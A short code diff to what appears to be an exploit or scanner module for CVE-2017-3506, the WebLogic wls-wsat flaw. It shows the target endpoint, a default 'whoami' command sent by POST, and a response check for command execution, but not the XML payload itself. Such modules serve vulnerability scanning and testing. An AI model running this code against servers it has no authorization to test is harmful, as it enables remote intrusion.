@@ -18,7 +18,7 @@ class CVE_2017_3506(Star):
         'CVE': 'CVE-2017-3506',
         'TAG': []
     }
-    type = target_type.MODULE
+    type = target_type.VULNERABILITY
 
     def light_up(self, dip, dport, cmd='whoami', *args, **kwargs) -> (bool, dict):
         url = 'http://{}:{}/wls-wsat/CoordinatorPortType'.format(dip, dport)
@@ -44,5 +44,5 @@ class CVE_2017_3506(Star):
 
         headers = {'Content-Type': 'text/xml'}
         res, data = http(url, 'POST', headers, data=data, verify=False)
-        return res and ('<faultstring>java.lang.ProcessBuilder' in res.text or "<faultstring>0" in res.text), {
+        return res != None and ('<faultstring>java.lang.ProcessBuilder' in res.text or "<faultstring>0" in res.text), {
             'msg': 'finish.'}
